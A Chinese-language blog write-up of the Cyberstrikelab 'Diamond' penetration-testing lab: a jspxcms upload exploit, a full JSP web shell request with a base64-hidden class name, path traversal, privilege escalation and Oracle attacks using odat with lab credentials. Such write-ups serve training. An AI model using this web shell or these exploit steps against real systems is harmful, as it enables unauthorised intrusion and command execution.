@@ -1,0 +1,477 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>Cyberstrikelab Diamond Writeup - L1nq Blog</title><meta name="author" content="L1nq">
+<meta name="description" content="Cyberstrikelab Diamond Writeup"><meta name="keywords" content='Cyberstrikelab'>
+  <meta itemprop="name" content="Cyberstrikelab Diamond Writeup">
+  <meta itemprop="description" content="Cyberstrikelab Diamond Writeup">
+  <meta itemprop="datePublished" content="2025-03-31T15:49:59+00:00">
+  <meta itemprop="dateModified" content="2026-07-09T18:38:23+08:00">
+  <meta itemprop="wordCount" content="205">
+  <meta itemprop="image" content="https://sw1mblu3.fun/1.jpg">
+  <meta itemprop="keywords" content="Cyberstrikelab"><meta property="og:url" content="https://sw1mblu3.fun/posts/cslab-diamond/">
+  <meta property="og:site_name" content="L1nq Blog">
+  <meta property="og:title" content="Cyberstrikelab Diamond Writeup">
+  <meta property="og:description" content="Cyberstrikelab Diamond Writeup">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-31T15:49:59+00:00">
+    <meta property="article:modified_time" content="2026-07-09T18:38:23+08:00">
+    <meta property="article:tag" content="Cyberstrikelab">
+    <meta property="og:image" content="https://sw1mblu3.fun/1.jpg">
+<meta name="twitter:card" content="summary" /><meta name="twitter:site" content="@L1nq1_" />
+  <meta name="twitter:creator" content="@L1nq1_" /><meta name="twitter:image" content="https://sw1mblu3.fun/1.jpg" /><meta name="twitter:title" content="Cyberstrikelab Diamond Writeup" /><meta name="twitter:description" content="Cyberstrikelab Diamond Writeup" /><meta name="application-name" content="L1nq Blog">
+<meta name="apple-mobile-web-app-title" content="L1nq Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="https://sw1mblu3.fun/posts/cslab-diamond/" title="Cyberstrikelab Diamond Writeup - L1nq Blog" /><link rel="prev" type="text/html" href="https://sw1mblu3.fun/posts/cslab-pearl/" title="Cyberstrikelab Pearl Writeup" /><link rel="next" type="text/html" href="https://sw1mblu3.fun/posts/hackthebox%E8%B5%9B%E5%AD%A3%E9%9D%B6%E6%9C%BA-haze/" title="HackTheBox Haze Writeup" /><link rel="alternate" type="text/markdown" href="https://sw1mblu3.fun/posts/cslab-diamond/index.md" title="Cyberstrikelab Diamond Writeup - L1nq Blog"><link rel="stylesheet" href="/css/config.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "Cyberstrikelab Diamond Writeup",
+    "inLanguage": "en",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "https:\/\/sw1mblu3.fun\/posts\/cslab-diamond\/"
+    },"image": ["https:\/\/sw1mblu3.fun\/1.jpg"],"genre": "posts","keywords": "Cyberstrikelab","wordcount":  205 ,
+    "url": "https:\/\/sw1mblu3.fun\/posts\/cslab-diamond\/","datePublished": "2025-03-31T15:49:59+00:00","dateModified": "2026-07-09T18:38:23+08:00","license": "2026","publisher": {
+      "@type": "Organization",
+      "name": "L1nq Blog","logo": "https:\/\/sw1mblu3.fun\/1.jpg"},"author": {
+        "@type": "Person",
+        "name": "L1nq"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script><meta name="view-transition" content="same-origin">
+<script>
+(function() {
+  
+  var hasNative = false;
+  try {
+    if (typeof CSS !== 'undefined' && CSS.supports) {
+      hasNative = CSS.supports('selector(::view-transition-old(root))');
+    }
+  } catch(e) {}
+  if (hasNative) return;
+
+  
+  document.addEventListener('click', function(e) {
+    var a = (e.target && e.target.closest) ? e.target.closest('a') : null;
+    if (!a || !a.href) return;
+    var url;
+    try { url = new URL(a.href, location.href); } catch(e) { return; }
+    if (url.origin !== location.origin) return;
+    if (a.target && a.target === '_blank') return;
+    if (a.hasAttribute && a.hasAttribute('download')) return;
+    if (e.metaKey || e.ctrlKey || e.altKey || e.shiftKey) return;
+
+    e.preventDefault();
+    try { sessionStorage.setItem('_vt', '1'); } catch(e) {}
+    document.documentElement.style.opacity = '0';
+    document.documentElement.style.transition = 'opacity 0.12s ease-out';
+    setTimeout(function() { location.href = a.href; }, 120);
+  }, { capture: true });
+
+  
+  try {
+    if (sessionStorage.getItem('_vt') === '1') {
+      sessionStorage.removeItem('_vt');
+      document.documentElement.style.opacity = '0';
+      document.documentElement.style.transition = 'none';
+      requestAnimationFrame(function() {
+        requestAnimationFrame(function() {
+          document.documentElement.style.transition = 'opacity 0.2s ease-in';
+          document.documentElement.style.opacity = '1';
+        });
+      });
+    }
+  } catch(e) {}
+})();
+</script>
+</head>
+  <body data-instant-intensity="viewport" data-header-desktop="sticky" data-header-mobile="auto">
+    <div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item">
+              <a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+              <i class="fa-solid fa-search" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+              <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" role="button" aria-label="Switch Theme" title="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="L1nq Blog"><span class="header-title-text">L1nq Blog</span></a><span class="header-subtitle"></span></div>
+      <div class="theme-switch" role="button" aria-label="Switch Theme"><i class="fa-solid fa-adjust" aria-hidden="true"></i></div>
+      <div class="menu-toggle" id="menu-toggle-mobile" role="button" aria-labelledby="menu-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                <i class="fa-solid fa-search" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                <i class="fa-solid fa-times-circle" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              Cancel
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-folder-tree fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/"><i class="fa-solid fa-link fa-sm" aria-hidden="true"></i> Links</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-user fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item"><a class="menu-link" href="/archives/"><i class="fa-solid fa-archive fa-sm" aria-hidden="true"></i> Archives</a></li><li class="menu-item menu-system"></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="fi-container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="Collections"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>Cyberstrikelab Diamond Writeup</span>
+      </h1></div><div class="post-meta">
+      <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="meta-calendar-icon">
+        <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+        <path d="M4 7a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v12a2 2 0 0 1 -2 2h-12a2 2 0 0 1 -2 -2v-12z"/>
+        <path d="M16 3v4"/><path d="M8 3v4"/><path d="M4 11h16"/>
+        <path d="M7 14h.013"/><path d="M10.01 14h.005"/><path d="M13.01 14h.005"/><path d="M16.015 14h.005"/>
+        <path d="M13.015 17h.005"/><path d="M7.01 17h.005"/><path d="M10.01 17h.005"/>
+      </svg><time datetime="2025-03-31T15:49:59Z">31 Mar, 2025</time><span aria-hidden="true">|</span>
+        <a href="true" target="_blank" rel="noopener noreferrer">Edit this page</a></div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>Contents</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#diamand-打靶记录">「Diamand」 打靶记录</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><p>Cyberstrikelab Diamond Writeup</p>
+<h1 class="heading-element" id="diamand-打靶记录"><span>「Diamand」 打靶记录</span>
+  <a href="#diamand-%e6%89%93%e9%9d%b6%e8%ae%b0%e5%bd%95" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p>扫描发现 8080 端口，访问，是一个内容管理系统
+<figure>
+  <img src="file-20250327195923940.png" alt="" loading="lazy"></figure>
+</p>
+<p><code>Google</code> 检索到了 <code>jspxcms</code> 后台管理路径</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">cmscp/login.do</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250330115903523.png" alt="" loading="lazy"></figure>
+</p>
+<p>尝试弱口令无果，转向测试历史漏洞，<code>jspxcms</code> 的历史漏洞应该是蛮多的，找到一个前台文件上传，注册账号 -&gt; 点击设置 -&gt; 稿件发布，可以上传文件
+<figure>
+  <img src="file-20250327203742354.png" alt="" loading="lazy"></figure>
+</p>
+<p>上传木马，POST 包如下</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">POST /ueditor?ueditor<span class="o">=</span>true<span class="p">&amp;</span><span class="nv">action</span><span class="o">=</span>uploadimage HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 192.168.10.45:8080
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">859</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">------geckoformboundary9896dee8fae223e579461dec813153ba
+</span></span><span class="line"><span class="cl">Content-Disposition: form-data<span class="p">;</span> <span class="nv">name</span><span class="o">=</span><span class="s2">&#34;upfile&#34;</span><span class="p">;</span> <span class="nv">filename</span><span class="o">=</span><span class="s2">&#34;1.jsp&#34;</span>
+</span></span><span class="line"><span class="cl">Content-Type: image/jpeg
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;%@ page <span class="nv">contentType</span><span class="o">=</span><span class="s2">&#34;text/html;charset=UTF-8&#34;</span> <span class="nv">language</span><span class="o">=</span><span class="s2">&#34;java&#34;</span> %&gt;
+</span></span><span class="line"><span class="cl">&lt;%@ page <span class="nv">import</span><span class="o">=</span><span class="s2">&#34;sun.misc.BASE64Decoder&#34;</span> %&gt;
+</span></span><span class="line"><span class="cl">&lt;%
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="o">(</span>request.getParameter<span class="o">(</span><span class="s2">&#34;cmd&#34;</span><span class="o">)</span>!<span class="o">=</span>null<span class="o">){</span>
+</span></span><span class="line"><span class="cl">    BASE64Decoder <span class="nv">decoder</span> <span class="o">=</span> new BASE64Decoder<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    Class <span class="nv">c</span> <span class="o">=</span> Class.forName<span class="o">(</span>new String<span class="o">(</span>decoder.decodeBuffer<span class="o">(</span><span class="s2">&#34;amF5c3lzdGVtcy5lY2hvc2F0ZXM=&#34;</span><span class="o">)))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    Process <span class="nv">p</span> <span class="o">=</span> <span class="o">(</span>Process<span class="o">)</span> c.getMethod<span class="o">(</span><span class="s2">&#34;exec&#34;</span>, new Class<span class="o">[]{</span>String.class<span class="o">})</span>.invoke<span class="o">(</span>c.newInstance<span class="o">()</span>, request.getParameter<span class="o">(</span><span class="s2">&#34;cmd&#34;</span><span class="o">)</span>.getBytes<span class="o">())</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    java.io.InputStream <span class="nv">in</span> <span class="o">=</span> p.getInputStream<span class="o">()</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    int <span class="nv">i</span> <span class="o">=</span> 0<span class="p">;</span>
+</span></span><span class="line"><span class="cl">    byte<span class="o">[]</span> <span class="nv">b</span> <span class="o">=</span> new byte<span class="o">[</span>2048<span class="o">]</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span><span class="o">((</span><span class="nv">i</span><span class="o">=</span>in.read<span class="o">(</span>b<span class="o">))</span> !<span class="o">=</span> -1<span class="o">){</span>
+</span></span><span class="line"><span class="cl">        out.print<span class="o">(</span>new String<span class="o">(</span>b<span class="o">))</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    out.print<span class="o">(</span><span class="s2">&#34;&lt;/pre&gt;&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">%&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">------geckoformboundary9896dee8fae223e579461dec813153ba--</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>结果显示生成成功，文件类型为 <code>JSP</code>
+<figure>
+  <img src="file-20250330114035430.png" alt="" loading="lazy"></figure>
+</p>
+<p>访问却是 <code>404</code>，本应该是 <code>403</code>，没有权限访问
+<figure>
+  <img src="file-20250330114515969.png" alt="" loading="lazy"></figure>
+</p>
+<p>根据复现内容继续用路径穿越执行命令，失败，返回 <code>500 or 404</code> ，复现失败。其他漏洞的话，<code>SSRF</code> 漏洞需要搭配才有效果，反序列化根据介绍爆破 <code>Shiro</code> 框架密钥要几个小时，也暂时不去尝试，后台有文件上传漏洞，还得尝试爆破管理员账号密码
+访问，嗯直接跳转进去了？怎么直接通过前台账号进后台了
+<figure>
+  <img src="file-20250330120603399.png" alt="" loading="lazy"></figure>
+</p>
+<p>后台什么信息也没有，左侧栏没有任务交互点，也许是最低权限账户的缘故
+<figure>
+  <img src="file-20250330120706247.png" alt="" loading="lazy"></figure>
+</p>
+<p>管理员密码爆破失败，此时卡住了，真去爆破几小时 <code>Shiro</code> 密钥么
+突然想起来之前根据结果判断上传应该是落地了，但返回 <code>404</code> ，有没有可能是木马被杀了，再尝试一下上传有免杀效果的 <code>JSP</code> 马
+使用 <code>ByPassGodzilla</code>生成 <code>JSP</code> 马
+<figure>
+  <img src="file-20250330124750563.png" alt="" loading="lazy"></figure>
+</p>
+<p>上传并使用哥斯拉连接，注意连接路径为</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">http://192.168.10.45:8080/app?template=/../../../../../uploads/1/image/public/202503/20250330043317_28a4yynja8.jsp?</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>连接成功！
+<figure>
+  <img src="file-20250330125105984.png" alt="" loading="lazy"></figure>
+</p>
+<p>终于进去了，先看杀软识别，发现 <code>360</code> 和 <code>Defender</code>
+<figure>
+  <img src="file-20250330171154005.png" alt="" loading="lazy"></figure>
+</p>
+<p>上线CS，还是熟悉的掩日，CS 生成 C 文件再免杀
+<figure>
+  <img src="file-20250330130617944.png" alt="" loading="lazy"></figure>
+
+<figure>
+  <img src="file-20250330130844651.png" alt="" loading="lazy"></figure>
+</p>
+<p>烂土豆提权
+<figure>
+  <img src="file-20250330131607725.png" alt="" loading="lazy"></figure>
+</p>
+<p>拿到 <code>Flag1</code>
+<figure>
+  <img src="file-20250330171531622.png" alt="" loading="lazy"></figure>
+</p>
+<p>登陆 <code>3389</code> 远程桌面
+<figure>
+  <img src="file-20250330171604886.png" alt="" loading="lazy"></figure>
+</p>
+<p>发现 C 盘底下存了一个用户名密码
+<figure>
+  <img src="file-20250331113731644.png" alt="" loading="lazy"></figure>
+</p>
+<p>顺手捡下数据库，可拿可不拿</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">net start mysql  //开启 mysql 服务</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250330171441138.png" alt="" loading="lazy"></figure>
+
+<figure>
+  <img src="file-20250330173724910.png" alt="" loading="lazy"></figure>
+</p>
+<p><code>stowaway</code> 搭建代理
+<figure>
+  <img src="file-20250331152455108.png" alt="" loading="lazy"></figure>
+</p>
+<p><code>Fscan</code> 扫描内网机器，<code>Web</code> 网站应该是 <code>Orable</code> 数据库的默认页面，没有漏洞
+<figure>
+  <img src="file-20250330174927805.png" alt="" loading="lazy"></figure>
+</p>
+<p>拿之前 C 盘找到的账号密码测试 <code>SMB</code> 和 <code>WMI</code> 远程登录，失败；测试 <code>Orable</code> 数据库
+这也是第一次碰到 <code>Orable</code>，边学边打，先用 <code>odat</code> 爆破 <code>SID</code></p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">proxychains4 odat sidguesser -s 172.17.50.33</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><strong>SID: ORCL</strong>
+<figure>
+  <img src="file-20250330191018940.png" alt="" loading="lazy"></figure>
+</p>
+<p>尝试命令行连接，但怎么连都没反应，可能是本地环境有问题</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">sqlplus &#39;cslab/cslab@123#wi@172.17.50.33:1521/ORCL&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">sqlplus /nolog
+</span></span><span class="line"><span class="cl">connect cslab@&#39;(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=172.17.50.33)(PORT=1521))(CONNECT_DATA=(SERVICE_NAME=ORCL)))&#39;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>使用 <code>odat</code> 登录，返回了 <code>SQLShell</code>，但执行没结果</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">proxychains4 odat search -s 172.17.50.33 -p 1521 -U cslab -P cslab@123#wi -d ORCL --sysdba --sql-shell</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="file-20250331113852887.png" alt="" loading="lazy"></figure>
+</p>
+<p><code>MDUT</code> 连接成功
+<figure>
+  <img src="file-20250330195122883.png" alt="" loading="lazy"></figure>
+</p>
+<p>但十分受限，文件功能只能看文件名，无法读取和上传文件，反弹 <code>Shell</code> 也报错
+<figure>
+  <img src="file-20250331113823158.png" alt="" loading="lazy"></figure>
+
+<figure>
+  <img src="file-20250331111734105.png" alt="" loading="lazy"></figure>
+</p>
+<p>命令执行返回 <code>null</code>，但目标本地是执行成功的，上线远程桌面
+<figure>
+  <img src="file-20250331111458998.png" alt="" loading="lazy"></figure>
+</p>
+<p>连接成功
+<figure>
+  <img src="file-20250331115737293.png" alt="" loading="lazy"></figure>
+</p>
+<p><code>Fscan</code> 扫描内网
+<figure>
+  <img src="file-20250331115657221.png" alt="" loading="lazy"></figure>
+</p>
+<p>打到这里 <code>CSLab</code> 突然宣布停服维护，那就稍等一天再继续打吧
+<figure>
+  <img src="fd4c7167e7804b46b3cc8d3f4ab8f0b.jpg" alt="" loading="lazy"></figure>
+</p>
+</div><div id="comments"><div id="giscus" class="comment">
+          <script
+            src="https://giscus.app/client.js"
+            data-repo="L1nq0/L1nq0.github.io"
+            data-repo-id="R_kgDOSLdcIg"
+            data-category="Announcements"
+            data-category-id="DIC_kwDOSLdcIs4DA03P"
+            data-mapping="pathname"
+            data-strict="0"
+            
+            data-theme="preferred_color_scheme"
+            data-reactions-enabled="1"
+            data-emit-metadata="0"
+            data-input-position="bottom"
+            data-lang="zh-CN"
+            data-loading="lazy"
+            crossorigin="anonymous"
+            async
+            defer
+          ></script>
+        </div>
+        <noscript>
+          Please enable JavaScript to view the comments powered by <a href="https://giscus.app/" rel="external nofollow noopener noreferrer">giscus</a>.
+        </noscript></div><div class="post-footer" id="post-footer"><ul class="post-footer-tags"><li class="post-footer-tag-item">
+          <a href="/tags/cyberstrikelab/" class="post-footer-tag-link" title="Tags - Cyberstrikelab">
+            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-tag-icon"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M5 9l14 0"/><path d="M5 15l14 0"/><path d="M11 4l-4 16"/><path d="M17 4l-4 16"/></svg>
+            <span>Cyberstrikelab</span>
+          </a>
+        </li></ul><div class="post-footer-share">
+    <span class="post-footer-share-label">Share this post on:</span>
+    <div class="post-footer-share-links"><a href="javascript:void(0);" title="Share on X" data-sharer="twitter" data-url="https://sw1mblu3.fun/posts/cslab-diamond/" data-title="Cyberstrikelab Diamond Writeup" data-via="map[icon:map[angellist: bandcamp: behance: bilibili: bitbucket: bluesky: buymeacoffee: class:fa-brands fa-x-twitter codepen: credly: csdn: deviantart: devto: diaspora: discord: discordinvite: douban: douyin: dribbble: facebook: feishu: fivehundredpx: flickr: foursquare: freecodecamp: gitea: gitlab: goodreads: googlescholar: hackernews: hackthebox: instagram: jsfiddle: kaggle: keybase: kickstarter: ko-fi: lastfm: liberapay: lichess: linktree: mastodon: matrix: mediawiki: medium: mix: odnoklassniki: orcid: patreon: paypal: phone: pinterest: pleroma: plume: qq: qqgroup: quora: reddit: researchgate: rootme: skype: slidershare: snapchat: soundcloud: spotify: stackoverflow: steam: strava: telegram: thingiverse: tiktok: tryhackme: tumblr: twitch: vine: vk: weibo: whatsapp: wordpress: xing: xmpp: youtubechannel: youtubecustom: youtubelegacy: zhihu:] id:L1nq1_ prefix:https://x.com/ title:X weight:2]" data-hashtags="Cyberstrikelab"><i class="fa-brands fa-x-twitter" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://sw1mblu3.fun/posts/cslab-diamond/" data-hashtag="Cyberstrikelab"><i class="fa-brands fa-facebook-square" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://sw1mblu3.fun/posts/cslab-diamond/" data-title="Cyberstrikelab Diamond Writeup"><i class="fa-brands fa-weibo" aria-hidden="true"></i></a>
+  </div>
+  </div><hr class="post-footer-divider">
+    <div class="post-footer-nav"><a href="/posts/cslab-pearl/" class="post-footer-nav-prev" rel="prev">
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M15 6l-6 6l6 6"/></svg>
+          <div>
+            <span class="post-footer-nav-label">Previous Post</span>
+            <div class="post-footer-nav-title">Cyberstrikelab Pearl Writeup</div>
+          </div>
+        </a><a href="/posts/hackthebox%E8%B5%9B%E5%AD%A3%E9%9D%B6%E6%9C%BA-haze/" class="post-footer-nav-next" rel="next">
+          <div>
+            <span class="post-footer-nav-label">Next Post</span>
+            <div class="post-footer-nav-title">HackTheBox Haze Writeup</div>
+          </div>
+          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="post-footer-nav-arrow"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M9 6l6 6l-6 6"/></svg>
+        </a></div></div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="Contents"><h2 class="toc-title">Contents&nbsp;<i class="toc-icon fa-solid fa-angle-down" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside><dialog id="toc-dialog" aria-labelledby="toc-dialog-title" role="dialog">
+      <div class="toc">
+        <h2 class="toc-title">Contents</h2>
+        <div class="toc-content" id="toc-content-drawer"><nav >
+  <ul>
+    <li><a href="#diamand-打靶记录">「Diamand」 打靶记录</a></li>
+  </ul>
